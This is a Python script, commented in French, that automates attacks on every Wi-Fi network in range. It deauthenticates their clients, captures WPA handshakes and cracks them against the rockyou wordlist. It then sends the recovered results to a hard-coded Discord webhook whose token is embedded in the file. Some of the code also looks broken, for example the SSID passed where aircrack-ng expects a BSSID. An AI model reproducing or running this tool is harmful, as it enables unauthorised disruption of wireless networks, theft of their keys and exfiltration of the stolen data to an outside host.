import os
import subprocess
import discord
from discord.ext import commands
from scapy.all import *
import time

# Configuration
INTERFACE = "wlan1"  # Interface Wi-Fi à utiliser
ROCKYOU_TXT = "rockyou.txt"  # Chemin vers le dictionnaire rockyou.txt
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1295144722633068544/8Ul3DDQNNGJ3ljMSTLy24ddAaLqTbyHumRQmWaU0dwutVYbYG7U6x5Fi1cYQam5tYkba"  # Webhook Discord


# Fonction pour capturer les réseaux Wi-Fi
def capture_wifi():
    print("Capture des réseaux Wi-Fi...")
    output = subprocess.check_output(["airodump-ng", INTERFACE]).decode()
    return output


# Fonction pour déauthentifier les clients
def deauth_clients(bssid):
    print(f"Déauthentification des clients sur le réseau {bssid}...")
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, INTERFACE])


# Fonction pour récupérer les handshakes
def get_handshakes(bssid, ssid):
    print(f"Récupération des handshakes pour le réseau {ssid}...")
    subprocess.run(["airodump-ng", "-w", ssid, "--bssid", bssid, INTERFACE])


# Fonction pour cracker les handshakes
def crack_handshakes(ssid):
    print(f"Crack des handshakes pour le réseau {ssid}...")
    results = subprocess.run(["aircrack-ng", "-w", ROCKYOU_TXT, "-b", ssid + "-01.cap"], capture_output=True, text=True)
    return results.stdout


# Fonction pour envoyer les résultats sur Discord
def send_results(results):
    print("Envoi des résultats sur Discord...")
    webhook = discord.Webhook.from_url(DISCORD_WEBHOOK, adapter=discord.RequestsWebhookAdapter())
    webhook.send(results)


# Programme principal
def main():
    wifi_output = capture_wifi()

    # Extraire les BSSID et les SSID des réseaux (cette partie doit être adaptée selon le format de sortie de airodump-ng)
    bssids = []  # Liste pour stocker les BSSID
    ssids = []  # Liste pour stocker les SSID
    for line in wifi_output.splitlines():
        if "BSSID" in line:  # Assurez-vous que la ligne contient les BSSID
            continue
        parts = line.split()  # Divisez la ligne pour extraire les informations
        if len(parts) > 0 and parts[0].count(':') == 5:  # Vérifiez si la ligne commence par un BSSID
            bssids.append(parts[0])  # Ajoutez le BSSID à la liste
            ssids.append(parts[13])  # Ajoutez le SSID à la liste

    for bssid, ssid in zip(bssids, ssids):
        deauth_clients(bssid)
        time.sleep(5)  # Attendez un peu pour permettre la déconnexion
        get_handshakes(bssid, ssid)
        results = crack_handshakes(ssid)
        send_results(results)


if __name__ == "__main__":
    main()
